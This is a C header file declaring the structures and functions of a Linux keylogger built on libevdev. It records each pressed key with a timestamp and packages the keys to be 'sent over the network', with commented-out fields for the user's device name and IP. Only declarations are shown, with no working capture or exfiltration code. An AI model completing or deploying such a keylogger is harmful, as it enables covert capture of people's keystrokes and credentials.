#pragma once

#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

/**
 * Represents all the associated data for one key that was pressed
 */
typedef struct {
  // size_t size;      // An integer representing the size of the key_info.
  char* key;        // A string representing a key that was pressed.
  char* timestamp;  // The approximate time (UTC) that the key was pressed.
  // char* application; /* Represents the active application of the user when
  // they
  //                       pressed the key. */
} key_info;

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  // size_t size;     // An integer representing the size of the key_package.
  key_info* keys;  // An array of keys to be sent over the network.
  size_t keys_arr_size;
  // char* host_device_name;  // A string representing the device name of the
  // user. char* host_device_IP;  // A string representing the user's IP.
} key_package;

/**
 * Documentation here
 */
void begin_keylogger(void);

/**
 * Documentation here
 */
void end_keylogger(void);

/**
 * Logs the current device.
 *
 * @param key_package A pointer to a key_package instance. Used to hold all
 * data for the overall session.
 */
void log_device(key_package* key_package);

void reset_structs(key_package* key_package);

/**
 * Given a key_package instance, prints all stored keys in the order they
 * appear in the array.
 *
 * @param key_package A pointer to a key_package instance. Used to hold all
 * data for the overall session.
 */
void print_logged_keys(key_package key_package);

void keys_to_file(FILE* package_log, key_package package);
